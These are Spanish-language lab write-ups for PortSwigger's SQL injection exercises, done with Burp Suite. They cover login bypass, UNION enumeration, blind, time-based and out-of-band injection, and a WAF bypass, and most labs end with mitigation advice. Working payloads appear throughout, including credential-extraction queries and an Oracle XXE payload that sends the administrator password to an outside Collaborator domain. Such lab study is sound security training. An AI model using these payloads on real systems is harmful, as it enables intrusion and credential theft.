Laboratorios APPRENTICE: 1. SQL Injection vulnerability in WHERE clause allowing retrieval of hidden data

Tipo de SQLi: SQL Injection basada en manipulación lógica (Boolean-Based SQL Injection) en la cláusula WHERE.

Se trata de una inyección que altera la lógica de la consulta SQL agregando una condición siempre verdadera (OR 1=1), lo que provoca que la cláusula WHERE devuelva todos los registros de la tabla.

También puede clasificarse como:

  • In-band SQL Injection
  • Boolean-based SQLi
  • SQLi en parámetro GET
  • SQLi en cláusula WHERE

Objetivo

El objetivo fue modificar la cláusula WHERE para que la condición evaluara como verdadera en todos los casos, permitiendo la recuperación de datos que normalmente no serían visibles para el usuario.

1. Acceso y Análisis Inicial

Primero ingresamos al laboratorio desde Web Security Academy y copiamos la URL generada automáticamente. El objetivo del laboratorio era explotar una vulnerabilidad de SQL Injection en la cláusula WHERE, con el fin de recuperar datos ocultos (productos que normalmente no se muestran).

Cuando cargamos la página vemos una tienda con filtros por categoría como:

Clothing Corporate gifts Food & Drink Lifestyle

2. Configuración de Burp Suite

Abrimos Burp Suite Community Edition y nos dirigimos a: Proxy → Intercept

  • Activamos la opción Intercept is on
  • Seleccionamos Open browser

Esto abre el navegador interno de Burp, el cual pasa todo el tráfico HTTP a través del proxy para poder interceptarlo y modificarlo.

3. Intercepción en el Navegador Interno

  • Pegamos la URL del laboratorio
  • La solicitud fue interceptada automáticamente por Burp
  • Hacemos clic en Forward all para permitir que la petición llegue al servidor

Esto permitió que la página cargara correctamente dentro del navegador de Burp.

4. Identificación del Vector

Después hacemos clic en la categoría: Corporate gifts. En ese momento Burp interceptó una petición como esta:

Aquí identifiqué que el parámetro se envía en la URL y es usado para filtrar productos. Este tipo de parámetro suele insertarse directamente en consultas SQL como:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Si la aplicación no valida correctamente el input, puede ser vulnerable a SQL Injection.

5. Uso del Repeater

Para poder modificar manualmente la petición:

  • Hacemos clic derecho sobre la solicitud interceptada
  • Seleccionamos Send to Repeater
  • Vamos a la pestaña Repeater

El Repeater permite modificar y reenviar solicitudes múltiples veces para probar diferentes cargas útiles (payloads).

6. Modificación del Parámetro (Payload)

En el Repeater modificamos la primera línea donde aparece el parámetro category. Originalmente estaba así:

  • GET /filter?category=Corporate+gifts HTTP/2

Lo modificamos agregando el payload '+OR+1=1-- quedando así:

GET /filter?category=Corporate+gifts'+OR+1=1-- HTTP/2

7. Ejecución y Resultados

Después de enviar la petición modificada:

  • La respuesta HTTP fue 200 OK
  • En el cuerpo de la respuesta aparecieron productos que normalmente no se muestran

8. Confirmación Final

El laboratorio marcó el estado como Solved. Esto confirma que:

  • La aplicación era vulnerable
  • Se logró recuperar información oculta
  • La inyección fue exitosa

2. SQL Injection vulnerability allowing login bypass

Tipo de SQLi: Error-based / Classic SQL Injection

Vulnerabilidad: El formulario de login construye una consulta SQL dinámica concatenando directamente los valores de los campos username y password sin sanitización ni uso de sentencias preparadas.

La consulta típica es del tipo: SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password'

Al inyectar un cierre de comilla simple (') en el campo username seguido de un comentario SQL (--), se altera la lógica: el -- comenta el resto de la consulta (incluyendo la verificación de contraseña), convirtiendo la condición en verdadera siempre que exista el usuario administrator.

Esto permite bypass de autenticación sin necesidad de conocer la contraseña, aprovechando que la aplicación no escapa caracteres especiales y refleja errores o resultados directamente. Se trata de una inyección in-band clásica con manipulación lógica (no requiere UNION ni extracción de datos adicionales).

Objetivo

Explotar una vulnerabilidad SQL Injection en el formulario de login para autenticarse como el usuario administrator sin conocer su contraseña real, modificando la lógica de la consulta SQL de autenticación y logrando acceso no autorizado a la aplicación.

Procedimiento

Paso 1: Ir a la sección de My Account

Accedemos al portal de autenticación del laboratorio.

Paso 2: Ingresar el Payload en Username

Ingresar en el campo Username: administrator'--

(El cierre de comilla simple termina la cadena del username, y -- comenta el resto de la consulta, incluyendo la cláusula AND password = '...').

Paso 3: Campo Password

Ingresar en el campo Password: cualquier valor arbitrario (ej. 123, vacío o lo que sea).

Paso 4: Enviar el formulario (Log in)

La consulta efectiva se convierte en algo como:

SELECT * FROM users WHERE username = 'administrator'--' AND password = 'cualquiercosa'

El -- comenta todo lo posterior, por lo que la condición se reduce a username = 'administrator', autenticando como administrador si el usuario existe.

Explicación del payload

El payload principal utilizado es: Username: administrator'-- | Password: cualquier valor arbitrario

  • El carácter ' cierra la cadena literal del campo username en la consulta SQL original.
  • El operador -- inicia un comentario de línea en SQL, descartando todo el código restante de la consulta, incluyendo la cláusula AND password = '...'.
  • Como resultado, la consulta efectiva se reduce a: SELECT * FROM users WHERE username = 'administrator'
  • Esta condición es verdadera si el usuario administrator existe en la tabla, permitiendo autenticación exitosa sin verificar la contraseña.

El payload explota la concatenación insegura de entradas en la consulta SQL y la falta de escape de caracteres especiales, logrando un bypass lógico de la autenticación sin necesidad de extraer datos ni usar técnicas más avanzadas como UNION o blind injection.

Mitigación recomendada

  • Implementar consultas parametrizadas o sentencias preparadas en el código de autenticación (ej. PreparedStatement en Java, cursor.execute() con placeholders en Python, PDO en PHP).
  • Realizar validación estricta de entradas en username y password (longitud máxima, caracteres permitidos mediante regex, prohibición explícita de comillas simples y guiones dobles --).
  • Almacenar contraseñas con hashing seguro (bcrypt, Argon2, PBKDF2) y nunca comparar contraseñas en texto plano.
  • Aplicar el principio de menor privilegio en la cuenta de base de datos utilizada por la aplicación.
  • Desplegar un Web Application Firewall (WAF) con reglas para detectar patrones comunes de SQLi (comillas, --, OR 1=1).

Objetivo: Mostrar la versión de la base de datos usando un ataque UNION-based SQL Injection.

Vulnerabilidad: La vulnerabilidad está en el parámetro category del filtro de productos.

Pero como no valida correctamente la entrada del usuario, puedes cerrar la comilla y añadir tu propia consulta: ' UNION SELECT ...

  • Permite concatenación directa del parámetro en la consulta SQL.

Eso permite o deja abierto a romper la consulta original, inyectar un UNION SELECT, y poder extraer información arbitraria de la base de datos.

5. SQL injection attack, listing the database contents on non-Oracle databases

Tipo de SQLi: Union-based SQL Injection (In-band / Clásico).

Objetivo: Explotar una vulnerabilidad SQL Injection en el parámetro category del filtro de productos para enumerar sistemáticamente el contenido de la base de datos no-Oracle: determinar el número de columnas, listar las tablas del esquema information_schema, identificar la tabla que almacena las credenciales de usuarios, enumerar sus columnas relevantes y extraer los usernames y passwords (incluyendo las del usuario administrador) para lograr acceso no autorizado y resolver el desafío mediante login.

Vulnerabilidad: La aplicación construye una consulta SQL dinámica concatenando directamente el valor del parámetro category sin usar consultas parametrizadas ni validación adecuada.

La consulta original es del tipo SELECT * FROM products WHERE category = 'input', con dos columnas devueltas (por ejemplo, nombre y descripción del producto). Al inyectar un cierre de comilla simple (') seguido de UNION SELECT, es posible combinar los resultados originales con consultas arbitrarias que devuelven datos de otras tablas.

Como los resultados se reflejan directamente en la respuesta HTTP (en la lista de productos), se trata de un ataque Union-based (in-band), permitiendo enumeración visible y extracción de datos sin necesidad de técnicas inferenciales (blind) ni canales externos (out-of-band). El DBMS es PostgreSQL (evidenciado por tablas pg_* e information_schema).

Procedimiento

El procedimiento se llevó a cabo mediante Burp Suite (Repeater y Proxy) para interceptar y modificar las solicitudes GET al endpoint /filter?category=....

Paso 1: Verificación de Columnas

Se interceptó la solicitud GET /filter?category=Gifts y se modificó el parámetro para inyectar:

La respuesta mostró los valores "abc" y "def" renderizados como productos, confirmando una inyección exitosa y exactamente dos columnas de tipo texto compatibles con UNION.

Paso 2: Listar Tablas

Se envió el payload:

La respuesta HTML presentó una lista de tablas del sistema, entre las cuales se identificó users_wdykho como la tabla que contiene las credenciales de usuarios.

Paso 3: Enumerar Columnas de la Tabla Identificada

Se utilizó el payload:

Gifts' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_wdykho'--

La respuesta mostró las columnas de la tabla, destacando username_eclowy y password_cvzrzx como las relevantes para autenticación.

Paso 4: Extracción de Credenciales

Se ejecutó:

Gifts' UNION SELECT password_cvzrzx, username_eclowy FROM users_wdykho--

La respuesta incluyó la lista completa de usuarios, permitiendo identificar el registro del usuario administrator junto con su contraseña correspondiente.

Paso 5: Acceso y Resolución

Acceder al login en /login con:

  • Username: administrator
  • Password: [Contraseña extraída del paso anterior]

Explicación del payload

El payload base utilizado sigue la estructura: ' UNION SELECT [columna1], [columna2] FROM [tabla]--

  • El cierre de comilla simple (') termina la cadena del WHERE original.
  • UNION SELECT combina resultados adicionales.
  • NULL o valores arbitrarios se usan en la segunda columna para cumplir con el número y tipos requeridos.
  • -- comenta el resto de la consulta original, evitando errores de sintaxis.

Esta técnica permite enumeración progresiva: metadatos → estructura → datos. La confirmación de resolución se obtuvo al autenticarse exitosamente como administrator, activando el mensaje "Congratulations, you solved the lab!".

Mitigación recomendada

La mitigación principal consiste en el uso obligatorio de consultas parametrizadas o sentencias preparadas en el código de la aplicación (ej. PreparedStatement en Java, cursor.execute() en Python). Adicionalmente:

  • Implementar validación de entrada estricta mediante listas blancas (whitelisting) de valores permitidos para el parámetro category.
  • Aplicar el principio de menor privilegio en la cuenta de base de datos, restringiendo accesos a vistas como information_schema.
  • Utilizar ORMs o frameworks que gestionen parametrización automática (Hibernate, Entity Framework, Django ORM).
  • Como capa adicional, desplegar un Web Application Firewall (WAF) con reglas específicas para detectar patrones de SQLi (comillas, UNION, comentarios).

10. SQL injection UNION attack, retrieving multiple values in a single column

Tipo de SQLi: SQL Injection, específicamente mediante SQL UNION Attack, que permite combinar resultados de consultas para obtener información de otras tablas de la base de datos.

Objetivo: Explotar una vulnerabilidad de Inyección SQL en el filtro de categorías de productos para extraer las credenciales (nombres de usuario y contraseñas) de la tabla users. Vulnerabilidad: La aplicación web no valida ni sanitiza correctamente la entrada del usuario en el parámetro category, permitiendo que un atacante inyecte consultas SQL arbitrarias. Esto posibilita ejecutar un ataque UNION que combina la consulta original con otra que recupera datos sensibles de la tabla users, exponiendo credenciales almacenadas en la base de datos.

Procedimiento

Como es costumbre, abriremos el laboratorio dentro de la web de Portswigger, copiando el enlace e iniciando Burp Suite.

Con el paquete atrapado, ahora podremos editar la solicitud antes de ser enviada al servidor, el único inconveniente es que debemos de cumplir con dos reglas de las bases de datos relacionales: la consulta inyectada debe devolver el mismo número de columnas que la original, y los tipos de datos deben ser compatibles.

El uso de NULL en la primera posición evita errores de tipo de dato mientras que 'abc' en la segunda posición confirma que la segunda columna es la que renderiza cadenas de texto en la respuesta HTTP. El -- comenta el resto de la consulta original para evitar errores de sintaxis.

11. Blind SQL injection with conditional responses

Objetivo: Explotar la vulnerabilidad para enumerar y extraer la contraseña del usuario administrator, logrando finalmente la autenticación en la plataforma.

Vulnerabilidad: El sistema procesa la cookie TrackingId en una consulta SQL sin la debida sanitización. Procedimiento

Accediendo a la página mediante el navegador de Burp Suite, revisamos y navegamos por la página, descubriendo que la pagina te muestra un ‘Welcome Back!’ al lado del botón ‘Home’ y ‘My account’, determinando que este mensaje se muestra por medio de una cookie.

Paso 1: Verificación de respuesta Booleana

Aquí nos centraremos en la variable de la cookie ‘TrackingId’, revisaremos si podemos ingresar desde esta variable a la BD, por lo cual probaremos una consulta simple:

TrackingId=R8Y42FuF2GZDJ9w4’ AND '1'='2

Probaremos si el texto de bienvenida responde en relación de un booleano; si el texto desaparece de nuestra sesión, entonces podremos manejar la base de datos mediante la cookie.

Resultado: Tuvimos una respuesta positiva, descubriendo que el texto si despareció de la página al mandar una sentencia falsa.

TrackingId=R8Y42FuF2GZDJ9w4' AND (SELECT 'a' FROM users LIMIT 1)='a

TrackingId=R8Y42FuF2GZDJ9w4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) = §1§)='a

TrackingId=Fh1TQZhc9X9dMFPS' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§'

  • Payload 1: Números del 1 al 20 (posición).

12. Blind SQL injection with conditional errors

Tipo de SQLi: Inyección SQL Ciega basada en Errores Condicionales (Conditional Error-based Blind SQLi)

Objetivo: Explotar una vulnerabilidad ciega en la que la aplicación no muestra diferencias en el contenido web, pero sí cambia el código de estado HTTP al ocurrir un error fatal en la base de datos. El fin es enumerar la contraseña del usuario administrator forzando errores matemáticos.

Vulnerabilidad: El servidor concatena la cookie TrackingId directamente en la consulta SQL. Si la consulta inyectada genera un error de ejecución en el motor SQL (como una división por cero), el servidor devuelve un HTTP 500 (Internal Server Error). Esto permite hacer preguntas de "sí o no" condicionando un error deliberado a una premisa verdadera.

Procedimiento

Entramos al laboratorio e inspeccionamos la página; esta vez no hay cambios visibles. Procederemos a atrapar una solicitud y ver cómo se comporta el sitio agregando una comilla simple (') al final del TrackingId.

Al agregar una comilla simple, el servidor arrojó un error. Al agregar dos comillas (''), el error desapareció, confirmando la inyección. Luego probamos:

TrackingId=uGePpEdWgmwfXu35'||(SELECT '')||'

Esta consulta falló. Sospechando de Oracle, probamos con su tabla dual:

TrackingId=uGePpEdWgmwfXu35 '||(SELECT '' FROM dual)||'

No recibimos error, confirmando que es una base de datos Oracle, la cual requiere estrictamente la cláusula FROM.

Paso 2: Forzado de Errores Condicionales

Construimos una estructura lógica utilizando CASE combinada con un error matemático forzado (división por cero):

TrackingId=uGePpEdWgmwfXu35’ ||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

Cada vez que la sentencia sea verdadera (TRUE), el servidor regresará un "Internal Server Error". Usaremos este error como ventana para consultar información.

Paso 3: Verificación de Usuario y Longitud de Contraseña

Confirmamos la existencia del administrador (recibiendo un error 500):

TrackingId=uGePpEdWgmwfXu35'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Luego determinamos la longitud de la contraseña usando Intruder (Sniper Attack):

TrackingId=uGePpEdWgmwfXu35'||(SELECT CASE WHEN LENGTH(password)= §1§ THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Editamos el Grep – Match para marcar los errores 500. Los resultados mostraron que la página dio error en el número 20, confirmando esa longitud.

Paso 4: Extracción de la Contraseña (Iteración Manual)

Para conseguir la contraseña, diseñamos un payload para consultar cada carácter:

TrackingId=uGePpEdWgmwfXu35 '||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

Para evitar el ruido y el tiempo excesivo de un ataque automático masivo, se optó por iterar manualmente las posiciones del 1 al 20, usando el diccionario de caracteres en Intruder para cada posición.

Paso 5: Resolución

Al finalizar las iteraciones, descubrimos la contraseña: 0xkkbi6793o8z2ep4map. Procedimos a probarla en la sección de login, logrando un inicio de sesión correcto y concluyendo el laboratorio.

Evidencia de Intruder: Error 500 detectado

Mitigación recomendada

  • Consultas Parametrizadas: Es la defensa fundamental contra cualquier tipo de SQLi.
  • Manejo Genérico de Errores: Configurar el servidor para que no devuelva respuestas distintas (como el código 500) ante excepciones de la base de datos; en su lugar, devolver una página de error estándar común para todos los casos.
  • Seguridad en Cookies: No utilizar datos provenientes de cookies directamente en consultas SQL sin validación previa.

Procedimiento

Entramos al laboratorio navegando por el sitio sin ningún cambio visible. Capturamos una request para editar su Cookie y agregamos una comilla simple (') al final del código.

Resultado: La página retornó un texto de error SQL crítico que reveló la estructura exacta de la consulta subyacente y confirmó que la inyección ocurría dentro de una cadena delimitada por comillas simples.

Paso 1: Confirmación de Control

Comentamos la consulta agregando -- al final de la comilla para descartar entradas posteriores. La página cargó sin problemas, indicando que el error previo era de sintaxis y confirmando nuestro control sobre las consultas.

Paso 2: Pruebas de Type Casting

Adaptamos el payload a una consulta genérica con SELECT, casteando el valor a INT para forzar un error de conversión:

TrackingId=C7O7mZ66ZdK9gsws' AND CAST((SELECT 1) AS int)--

El resultado fue un error en el argumento AND, indicando que debe ser booleano. Ajustamos la consulta a una comparación:

TrackingId=C7O7mZ66ZdK9gsws' AND 1=CAST((SELECT 1) AS int)--

Esto nos regresó a la página principal (TRUE), pero no nos dio retroalimentación de datos.

Paso 3: Optimización del Espacio en la Cookie

Intentamos consultar la tabla de usuarios:

TrackingId=C7O7mZ66ZdK9gsws ' AND 1=CAST((SELECT username FROM users) AS int)--

El error indicó que la respuesta estaba truncada debido a un límite de caracteres en la cookie. Como el código de sesión no es necesario para la inyección, lo eliminamos para ganar espacio:

TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

Añadimos LIMIT 1 ya que CAST solo opera sobre un valor único. El motor SQL intentó convertir el nombre de usuario a entero, falló y escupió el nombre del usuario en el reporte de error.

Paso 4: Extracción de Credenciales y Resolución

Con el administrador identificado como el primer registro, diseñamos la consulta para extraer la contraseña:

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

El servidor arrojó un nuevo error de sintaxis que contenía la contraseña en texto plano: i3rpmtbwp1xi74smj59z. Procedimos a validar las credenciales en el login de forma exitosa.

Evidencia del Error Verbose: Contraseña Extraída

Mitigación recomendada

  • Páginas de Error Personalizadas: Configurar la aplicación para mostrar mensajes genéricos y nunca el error crudo del motor de base de datos.
  • Consultas Parametrizadas: Utilizar Prepared Statements para evitar la concatenación de entradas en la cookie.
  • Mínimo Privilegio: Asegurar que la cuenta de conexión de la DB no tenga permisos excesivos que faciliten la enumeración de tablas sensibles.
Nivel: PRACTITIONER

14. Blind SQL injection with time delays

Tipo de SQLi: Blind SQL Injection basada en tiempo (Time‑based)

Objetivo: Explotar una vulnerabilidad de SQL Injection para forzar un retraso de 10 segundos en la respuesta del servidor, demostrando que la consulta SQL se ejecuta de forma síncrona.

Vulnerabilidad: La aplicación utiliza una cookie de seguimiento (tracking cookie) para análisis. El valor de esta cookie se inserta directamente en una consulta SQL sin validación, permitiendo inyectar condiciones que generen retrasos temporales.

Procedimiento

Paso 1 y 2: Preparación del Entorno

Se ingresa a la plataforma de Web Security Academy y se accede al entorno del laboratorio, copiando la URL proporcionada para las pruebas.

Paso 4 y 5: Intercepción y Análisis

Se pega el enlace en el navegador de Burp Suite para capturar las peticiones HTTP en el proxy. Se analiza el historial de tráfico para identificar la petición que contiene la cookie de seguimiento TrackingId.

Paso 6 y 7: Configuración en Repeater

Se envía la petición al módulo Repeater para manipularla de forma manual. Se consulta la documentación de ayuda del laboratorio en la sección "Time delays" para estructurar el payload adecuado según el motor de base de datos correspondiente.

Paso 8: Inyección del Payload

Se modifica la cookie TrackingId agregando una comilla simple (') después del valor numérico. Se inyecta el comando de retraso concatenando con el signo + (en lugar de espacios) y se finaliza con doble guion (--) para comentar el resto de la consulta original.

TrackingId=x'+AND+(SELECT+pg_sleep(10))--

Paso 9: Verificación y Resolución

Al enviar la petición modificada, observamos en el Repeater un retraso de respuesta de 10 segundos exactos. El servidor procesa la instrucción de suspensión antes de devolver la respuesta HTTP.

Al enviarlo, efectivamente hace el retraso de 10 segundos, dándonos el laboratorio como resuelto y mostrando el mensaje: “Congratulations, you solved the lab!”.

Evidencia de Respuesta Síncrona (Time Delay)

Mitigación recomendada

  • Consultas Parametrizadas: Utilizar Prepared Statements para que el motor de la base de datos no interprete comandos de control (como pg_sleep o dbms_pipe.receive_message) inyectados en las cookies.
  • Validación de Cookies: Implementar filtros que rechacen caracteres especiales como comillas y paréntesis en campos que solo deben contener identificadores alfanuméricos.
  • Timeouts de Consulta: Configurar tiempos de espera máximos en la ejecución de consultas para mitigar ataques de denegación de servicio (DoS) por acumulación de procesos en espera.
Nivel: PRACTITIONER

15. Blind SQL injection with time delays and information retrieval

Tipo de SQLi: Blind SQL Injection basada en tiempo (Time-based) y recuperación de información.

Objetivo: Explotar una vulnerabilidad de inyección SQL basada en tiempo para inferir, carácter por carácter, la contraseña del usuario administrator y lograr el acceso a la plataforma.

Vulnerabilidad: La aplicación utiliza una cookie de seguimiento (TrackingId) que se inserta de forma insegura en una consulta SQL síncrona. Como la base de datos es PostgreSQL, podemos inyectar la función pg_sleep() para forzar retrasos de tiempo condicionales. Al medir cuánto tarda en responder el servidor, podemos deducir si una condición inyectada es verdadera o falsa.

Procedimiento

Pasos 1 a 5: Preparación e Intercepción

Se inicia el laboratorio y se abre Burp Suite para capturar la navegación. Identificamos la petición HTTP que contiene la cookie TrackingId, que será nuestro punto de inyección, y la enviamos al Repeater.

Pasos 6 y 7: Validación de la Inyección Condicional

Aplicamos el primer payload de prueba:

'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

El servidor tarda 10 segundos en responder, confirmando que la condición es verdadera. Para validar, enviamos:

'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--

Como 1 no es igual a 2, la aplicación responde inmediatamente sin demora.

Pasos 8 a 10: Determinación de la Longitud

Enviamos la petición al Intruder para un ataque enfocado en la longitud de la contraseña. Configuramos un contador numérico (1 al 26) usando LENGTH(password)>§1§. Notamos que a partir de la longitud 20 el tiempo de respuesta cambia, confirmando que la contraseña tiene exactamente 20 caracteres.

Pasos 11 a 15: Ataque Cluster Bomb y Extracción

Preparamos el payload de extracción de datos en el Repeater:

'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

En el Intruder, seleccionamos el tipo de ataque Cluster Bomb con dos payloads:

  • Payload 1: Contador para la posición (1 al 20).
  • Payload 2: Fuerza bruta probando cada posible carácter (a-z, 0-9).

Configuración Crítica: En la pestaña "Resource pool", configuramos Maximum concurrent requests: 1 para evitar que múltiples peticiones síncronas generen falsos positivos en el tiempo de respuesta.

Pasos 16 a 18: Recopilación y Acceso

Al concluir, ordenamos los resultados por la columna "Response received" (tiempo de respuesta). Las peticiones con retrasos superiores a 5000ms nos revelaron los caracteres en su posición respectiva.

Contraseña obtenida: tmmowcfokak4zmj52ky0

Ingresamos a "My account" con el usuario administrator y la contraseña extraída, logrando el acceso exitoso y concluyendo el laboratorio.

Evidencia de Extracción: Caracteres identificados por retraso

Mitigación recomendada

  • Consultas Parametrizadas: Es la única forma definitiva de evitar que comandos como pg_sleep o SUBSTRING sean ejecutados desde una entrada de usuario.
  • Reducción de Privilegios: La cuenta de la base de datos no debe tener permisos para ejecutar funciones de temporización o acceder a tablas de usuarios si no es estrictamente necesario.
  • Detección de Anomalías: Implementar sistemas que detecten ráfagas de solicitudes con tiempos de respuesta inusualmente altos o patrones de fuerza bruta.
Nivel: Intermedio (Practitioner)

16. Blind SQL injection with out-of-band interaction

Tipo de SQLi: Inyección SQL fuera de banda (Out-of-band SQLi / OAST).

Objetivo: Explotar una vulnerabilidad de inyección SQL en una cookie de seguimiento, causando una búsqueda DNS en Burp Collaborator.

Vulnerabilidad: Cookie de Rastreo; puede modificarse por una carga útil que mezcla la inyección SQL con una técnica XXE (XML External Entity) para activar una interacción con el servidor Burp Collaborator. Esta técnica aprovecha configuraciones débiles en los analizadores XML para forzar peticiones a redes externas.

Nota: Para esta práctica es necesario utilizar la versión **Professional** de Burp Suite para acceder al cliente de Collaborator.

Procedimiento

Se envían todas las solicitudes HTTP que realiza el navegador. Posteriormente, se manda al Repeater la solicitud HTTP de la página de inicio. En las cookies se encuentra el tracking_id, la vulnerabilidad que tenemos a la mano para poder explotar el sitio.

Paso 1: Generar el Burp Collaborator Client

Se genera un “Burp Collaborator Client”, la herramienta principal para este laboratorio. Este genera un subdominio específico que permite detectar vulnerabilidades que no devuelven una respuesta directa en el sitio web (invisibles al atacante de forma directa).

Con esta herramienta, el subdominio se sondea para confirmar que la búsqueda DNS se haya realizado con éxito tras la inyección.

Paso 2: Selección del Payload (Oracle XXE)

Siguiendo la pista de la actividad en la sección de "Búsqueda DNS", seleccionamos el payload para bases de datos Oracle. El XXE que nos interesa utiliza funciones de red de la base de datos para forzar la interacción externa.

Esta carga útil se mezcla con la consulta de la cookie incluyendo el subdominio generado. La función del payload no es “tomar información” en este paso, sino actuar como un radar, forzando a la base de datos a llamar a nuestro servidor.

Paso 3: Construcción de la Inyección

Se le agrega una comilla simple (') para cerrar la cadena de texto original de la cookie de seguimiento en la consulta SQL subyacente:

SELECT tracking_id FROM analytics WHERE tracking_id = 'cadena_de_la_cookie'

Al colocar la comilla al principio del payload, cerramos el valor y preparamos la consulta para inyectar el código malicioso. Utilizamos el operador || (u otro método de concatenación según el contexto) para unir la consulta original con la inyectada.

'||(SELECT+extractvalue(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://BURP-COLLABORATOR-SUBDOMAIN">+%25remote%3B]>'),'/l')+FROM+dual)--

Paso 4: Verificación y Resolución

Al enviar la petición en el Repeater, sondeamos las interacciones en el cliente de Collaborator. Por el nombre del dominio y la IP en los registros de entrada (DNS/HTTP), corroboramos que se logró realizar la búsqueda con éxito.

Esto muestra que la base de datos ejecutó nuestra instrucción y salió a internet para resolver el dominio, confirmando que el laboratorio ha sido completado.

Evidencia de Interacción en Burp Collaborator

Mitigación recomendada

  • Deshabilitar funciones de red: Restringir la capacidad de la base de datos para realizar peticiones externas (DNS, HTTP, SMB) mediante permisos a nivel de sistema operativo y base de datos.
  • Parchear analizadores XML: Mantener actualizadas las bibliotecas de procesamiento XML para mitigar ataques XXE que son utilizados como vector en estas inyecciones.
  • Consultas Parametrizadas: Como en toda SQLi, evitar que datos del usuario (cookies) se concatenen en la lógica de la consulta.
Nivel: Intermedio (Practitioner)

17. Blind SQL injection with out-of-band data exfiltration

Tipo de SQLi: Inyección SQL fuera de banda (Out-of-band SQLi / OAST).

Objetivo: Explotar una vulnerabilidad de inyección SQL en una cookie de seguimiento, ahora con exfiltración de información, obteniendo las claves de acceso del administrador.

Vulnerabilidad: Similar al laboratorio anterior, se aprovecha una vulnerabilidad en la cookie de rastreo para forzar una interacción externa. Sin embargo, en este caso la carga útil se diseña para que el servidor de la base de datos incluya datos sensibles (como la contraseña) como parte del subdominio consultado en la búsqueda DNS.

Procedimiento

Al agregar el sitio web al proxy y tomar la solicitud del sitio principal, obtenemos el resultado en el Repeater confirmando que el sitio funciona correctamente.

Paso 1: Configuración de Burp Collaborator

Creamos un nuevo subdominio único utilizando el cliente de Burp Collaborator. Este actuará como nuestro receptor de información fuera de banda.

Paso 2: Selección del Payload de Exfiltración

Consultando el acordeón de SQLi de Portswigger, seleccionamos la carga útil para Oracle. A diferencia de la práctica anterior, que sólo hacía un "ping" para confirmar la vulnerabilidad, este payload nos permite realizar consultas para extraer información de la BD.

La estructura del payload utiliza funciones de red para resolver un nombre de dominio que nosotros construimos dinámicamente.

Paso 3: Construcción de la Consulta de Extracción

Lo que buscamos es obtener la contraseña del usuario administrador. Realizamos la inyección de SQL en la cookie utilizando los caracteres +||+, que funcionan como la sintaxis de concatenación de cadenas en Oracle.

'||(SELECT+extractvalue(xmltype('<?xml+version="1.0"+encoding="UTF-8"?><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://"||(SELECT+password+FROM+users+WHERE+username='administrator')||".BURP-COLLABORATOR-SUBDOMAIN">+%25remote%3B]>'),'/l')+FROM+dual)--

Nótese cómo la consulta SELECT password FROM users se concatena directamente antes del subdominio de Collaborator.

Paso 4: Recepción de Datos y Resolución

Al enviar la petición y sondear nuestro subdominio en el cliente de Collaborator, obtenemos la clave del administrador concatenada como un prefijo en la consulta DNS recibida.

Resultado: Identificamos la contraseña en los logs de Collaborator. Intentamos entrar con la contraseña obtenida y el usuario administrator, lo cual nos permite el acceso exitoso, terminando el laboratorio con éxito.

Evidencia de Exfiltración en Logs DNS

Mitigación recomendada

  • Prevención de Exfiltración DNS: Configurar el firewall y los servidores DNS internos para que solo permitan resoluciones de dominios autorizados (listas blancas), bloqueando peticiones hacia dominios desconocidos provenientes de los servidores de bases de datos.
  • Consultas Parametrizadas: Implementar Prepared Statements para neutralizar la capacidad del atacante de inyectar lógica de concatenación en las cookies.
  • Hardening de Oracle: Deshabilitar o restringir el acceso a paquetes como UTL_HTTP, UTL_INADDR o la funcionalidad de XMLTYPE que permite interacciones externas.
Nivel: PRACTITIONER

18. SQL injection with filter bypass via XML encoding

Tipo de SQLi: SQL Injection basada en UNION con bypass de filtros mediante codificación XML.

Objetivo: Explotar la vulnerabilidad de inyección SQL en la función de verificación de stock para obtener datos de otras tablas, específicamente recuperar el usuario y contraseña del administrador, y posteriormente iniciar sesión.

Vulnerabilidad: La aplicación web presenta una vulnerabilidad en la función que consulta el stock de productos. Los datos enviados en formato XML se insertan directamente en una consulta SQL. Aunque existe un filtro (WAF) que bloquea caracteres sospechosos, este puede ser evadido utilizando codificación de entidades XML, lo que permite inyectar consultas de forma indirecta.

Procedimiento

  1. Abrimos Burp Suite Community Edition. Damos click en siguiente y Start up.
  2. Nos vamos a Proxy y Open Browser.
  3. Pegamos la URL del laboratorio en la nueva ventana.
  4. Realizamos una petición de "Check stock", hacemos click derecho y Send to Repeater.

Análisis y Prueba de Filtro

Observamos que los datos se envían en una estructura XML: <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>.

Si intentamos inyectar un payload simple como 1 UNION SELECT NULL en el storeId, el servidor responde con un 403 Forbidden y el mensaje "Attack detected".

Bypass mediante codificación (Hackvertor)

Para evadir el filtro, instalamos la extensión Hackvertor en Burp Suite. Seleccionamos nuestro payload y aplicamos la codificación hex_entities. Esto convierte el texto claro en entidades hexadecimales que el filtro no reconoce como maliciosas.

Determinación de columnas: Probamos con el payload codificado. El servidor responde con un 200 OK, confirmando que la inyección es procesada correctamente tras ser decodificada por el parser XML interno.

Extracción de credenciales

Según el cheat sheet de PortSwigger, para concatenar valores en una sola columna en PostgreSQL/MySQL usamos el operador ||. El payload final inyectado en storeId (y luego codificado) es:

1 UNION SELECT username || '~' || password FROM users

Resolución

